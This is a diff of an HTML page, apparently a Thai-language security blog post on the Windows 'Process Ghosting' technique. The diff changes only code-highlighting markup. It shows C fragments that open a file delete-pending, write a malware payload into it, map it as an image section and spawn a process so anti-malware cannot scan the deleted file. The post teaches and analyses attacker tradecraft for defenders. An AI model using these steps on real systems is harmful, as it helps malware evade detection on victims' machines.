@@ -209,14 +209,14 @@ Tampering Attacks ก่อนจะไปพูดถึงเมนูหล�
 </ul>
 </li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">NTSTATUS stat <span style="color:#f92672">=</span> NtOpenFile(<span style="color:#f92672">&amp;</span>file, 
-    DELETE <span style="color:#f92672">|</span> SYNCHRONIZE <span style="color:#f92672">|</span> GENERIC_READ <span style="color:#f92672">|</span> GENERIC_WRITE,
-    <span style="color:#f92672">&amp;</span>attr, 
-    <span style="color:#f92672">&amp;</span>status_block, 
-    FILE_SHARE_READ <span style="color:#f92672">|</span> FILE_SHARE_WRITE,
-    FILE_SUPERSEDE <span style="color:#f92672">|</span> FILE_SYNCHRONOUS_IO_NONALERT
-);
-</code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>NTSTATUS stat <span style="color:#f92672">=</span> NtOpenFile(<span style="color:#f92672">&amp;</span>file, 
+</span></span><span style="display:flex;"><span>    DELETE <span style="color:#f92672">|</span> SYNCHRONIZE <span style="color:#f92672">|</span> GENERIC_READ <span style="color:#f92672">|</span> GENERIC_WRITE,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&amp;</span>attr, 
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&amp;</span>status_block, 
+</span></span><span style="display:flex;"><span>    FILE_SHARE_READ <span style="color:#f92672">|</span> FILE_SHARE_WRITE,
+</span></span><span style="display:flex;"><span>    FILE_SUPERSEDE <span style="color:#f92672">|</span> FILE_SYNCHRONOUS_IO_NONALERT
+</span></span><span style="display:flex;"><span>);
+</span></span></code></pre></div><ul>
 <li>ผ่านฟังก์ชัน <code>CreateFileW</code> (อาจใช้เป็นฟังก์ชันที่เกี่ยวข้องกับการเปิดไฟล์แทนได้ เช่น <code>OpenFile</code>)
 <ul>
 <li>กำหนด flag <code>CREATE_ALWAYS</code> ใน <code>dwCreationDisposition</code> เพื่อให้มีการสร้างไฟล์ใหม่เสมอแม้จะมีไฟล์เดิมอยู่ ซึ่งหากมีไฟล์เดิม การกำหนด flag จะเท่ากับการสร้างไฟล์ใหม่ทับไฟล์เดิม</li>
@@ -225,57 +225,57 @@ Tampering Attacks ก่อนจะไปพูดถึงเมนูหล�
 </li>
 <li>หลังจากมีการกำหนด flag ทั้งในกรณีที่มีการเรียกใช้ <code>NtCreateFile</code> หรือในกรณีที่มีการเรียกใช้ <code>CreateFileW</code> เสร็จแล้ว ให้ทำการเรียกใช้ฟังก์ชัน <code>NtSetInformationFile</code> ที่มีการระบุคลาส <code>FileDispositionInformation</code> เอาไว้ คลาส <code>FileDispositionInformation</code> ที่อ้างอิงมาจากสตรัคเจอร์ <code>FILE_DISPOSITION_INFORMATION</code> จะต้องมีการกำหนดค่าในฟิลด์ <code>DeleteFile</code> ให้เป็น <code>TRUE</code> ด้วย</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">FILE_DISPOSITION_INFORMATION info <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
-info.DeleteFile <span style="color:#f92672">=</span> TRUE;
-NtSetInformationFile(
-    hDelFile,
-    <span style="color:#f92672">&amp;</span>status_block,
-    <span style="color:#f92672">&amp;</span>info,
-    <span style="color:#66d9ef">sizeof</span>(info),
-    FileDispositionInformation
-);
-</code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>FILE_DISPOSITION_INFORMATION info <span style="color:#f92672">=</span> { <span style="color:#ae81ff">0</span> };
+</span></span><span style="display:flex;"><span>info.DeleteFile <span style="color:#f92672">=</span> TRUE;
+</span></span><span style="display:flex;"><span>NtSetInformationFile(
+</span></span><span style="display:flex;"><span>    hDelFile,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&amp;</span>status_block,
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&amp;</span>info,
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">sizeof</span>(info),
+</span></span><span style="display:flex;"><span>    FileDispositionInformation
+</span></span><span style="display:flex;"><span>);
+</span></span></code></pre></div><ul>
 <li>ทำการเขียนไฟล์จาก handle ของไฟล์ที่เราได้มาจาก <code>NtCreateFile</code> หรือ <code>CreateFileW</code> ด้วยโค้ด(ของมัลแวร์)ที่เราต้องการ</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">status <span style="color:#f92672">=</span> NtWriteFile(
-        hDelFile,
-        NULL,
-        NULL,
-        NULL, 
-        <span style="color:#f92672">&amp;</span>status_block,
-        payladBuf, 
-        payloadSize,
-        <span style="color:#f92672">&amp;</span>ByteOffset,
-        NULL
-);
-</code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>status <span style="color:#f92672">=</span> NtWriteFile(
+</span></span><span style="display:flex;"><span>        hDelFile,
+</span></span><span style="display:flex;"><span>        NULL,
+</span></span><span style="display:flex;"><span>        NULL,
+</span></span><span style="display:flex;"><span>        NULL, 
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&amp;</span>status_block,
+</span></span><span style="display:flex;"><span>        payladBuf, 
+</span></span><span style="display:flex;"><span>        payloadSize,
+</span></span><span style="display:flex;"><span>        <span style="color:#f92672">&amp;</span>ByteOffset,
+</span></span><span style="display:flex;"><span>        NULL
+</span></span><span style="display:flex;"><span>);
+</span></span></code></pre></div><ul>
 <li>เตรียมการสร้างโปรเซสด้วยการสร้างอิมเมจจากไฟล์ที่จะเป็นวัตถุดิบในการสร้างโปรเซสก่อนด้วยฟังก์ชัน <code>NtCreateSection</code> ในขั้นตอนนี้หากการสร้างอิมเมจสมบูรณ์ เราจะได้ handle ของอิมเมจมาเพื่อใช้สร้างโปรเซสต่อ</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">HANDLE hSection <span style="color:#f92672">=</span> nullptr;
-status <span style="color:#f92672">=</span> NtCreateSection(<span style="color:#f92672">&amp;</span>hSection,
-    SECTION_ALL_ACCESS,
-    NULL,
-    <span style="color:#ae81ff">0</span>,
-    PAGE_READONLY,
-    SEC_IMAGE,
-    hDelFile
-);
-</code></pre></div><ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>HANDLE hSection <span style="color:#f92672">=</span> nullptr;
+</span></span><span style="display:flex;"><span>status <span style="color:#f92672">=</span> NtCreateSection(<span style="color:#f92672">&amp;</span>hSection,
+</span></span><span style="display:flex;"><span>    SECTION_ALL_ACCESS,
+</span></span><span style="display:flex;"><span>    NULL,
+</span></span><span style="display:flex;"><span>    <span style="color:#ae81ff">0</span>,
+</span></span><span style="display:flex;"><span>    PAGE_READONLY,
+</span></span><span style="display:flex;"><span>    SEC_IMAGE,
+</span></span><span style="display:flex;"><span>    hDelFile
+</span></span><span style="display:flex;"><span>);
+</span></span></code></pre></div><ul>
 <li>ก่อนจะทำการสร้างโปรเซส เรียกใช้ฟังก์ชัน <code>NtClose</code> เพื่อปิด handle ที่เกิดจาก <code>NtCreateFile</code> หรือ <code>CreateFileW</code> อ้างอิงจาก flag ที่เรากำหนดไว้ในขั้นตอนก่อนหน้า เมื่อมีการปิด handle ที่เกี่ยวข้องกับไฟล์แล้ว ไฟล์ที่ handle นี้เชื่อมโยงจะถูกลบ</li>
 <li>นำ handle ของอิมเมจที่ได้จากการเรียกใช้ฟังก์ชัน <code>NtCreateSection</code> ไปสร้างเป็นโปรเซสต่อ โดยอาจใช้ฟังก์ชันอย่าง <code>NtCreateProcessEx</code> แล้วทำการระบุพารามิเตอร์ในส่วน <code>sectionHandle</code> เป็น handle ของอิมเมจที่เรามีอยู่</li>
 </ul>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c">NTSTATUS status <span style="color:#f92672">=</span> NtCreateProcessEx(
-    <span style="color:#f92672">&amp;</span>hProcess,
-    PROCESS_ALL_ACCESS,
-    NULL,
-    NtCurrentProcess(),
-    PS_INHERIT_HANDLES,
-    hSection,
-    NULL,
-    NULL,
-    FALSE
-);
-</code></pre></div><p>สิ่งที่เราทำในขั้นตอนที่ผ่านมาทั้งหมดนั้นมีใจความสำคัญคือการสร้างไฟล์ที่มีสถานะ “กำลังจะถูกลบ” ติดอยู่ และทำการลบทันที “เมื่อมีการสร้าง section ที่เป็นอิมเมจ ก่อนที่จะนำอิมเมจไปสร้างเป็นโปรเซส”</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span>NTSTATUS status <span style="color:#f92672">=</span> NtCreateProcessEx(
+</span></span><span style="display:flex;"><span>    <span style="color:#f92672">&amp;</span>hProcess,
+</span></span><span style="display:flex;"><span>    PROCESS_ALL_ACCESS,
+</span></span><span style="display:flex;"><span>    NULL,
+</span></span><span style="display:flex;"><span>    NtCurrentProcess(),
+</span></span><span style="display:flex;"><span>    PS_INHERIT_HANDLES,
+</span></span><span style="display:flex;"><span>    hSection,
+</span></span><span style="display:flex;"><span>    NULL,
+</span></span><span style="display:flex;"><span>    NULL,
+</span></span><span style="display:flex;"><span>    FALSE
+</span></span><span style="display:flex;"><span>);
+</span></span></code></pre></div><p>สิ่งที่เราทำในขั้นตอนที่ผ่านมาทั้งหมดนั้นมีใจความสำคัญคือการสร้างไฟล์ที่มีสถานะ “กำลังจะถูกลบ” ติดอยู่ และทำการลบทันที “เมื่อมีการสร้าง section ที่เป็นอิมเมจ ก่อนที่จะนำอิมเมจไปสร้างเป็นโปรเซส”</p>
 <p>หากอ้างคำพูดในรีเสิร์ชต้นฉบับ โปรเซสซึ่งเหมือนกับวิญญาณนั้นถูกสร้างจากไฟล์ซึ่งเหมือนกับร่างที่กำลังจะตาย (ถูกลบ) เทคนิคนี้จึงถูกเรียกว่า Process Ghosting</p>
 <p>ในมุมของการพยายามตรวจสอบและเชื่อมโยงโปรเซสที่เกิดขึ้นใหม่กลับไปยังไฟล์โดยโปรแกรม Anti malware หากความพยายามในการตรวจสอบเกิดขึ้นหลังจากไฟล์ถูกลบออกไปแล้ว นั่นหมายถึงโปรแกรม Anti malware จะไม่เจอไฟล์ที่เชื่อมโยงกับโปรเซส และทำให้โปรแกรม Anti malware ไม่สามารถตรวจสอบได้</p>
 <h1 id="proof-of-concept">Proof of Concept</h1>
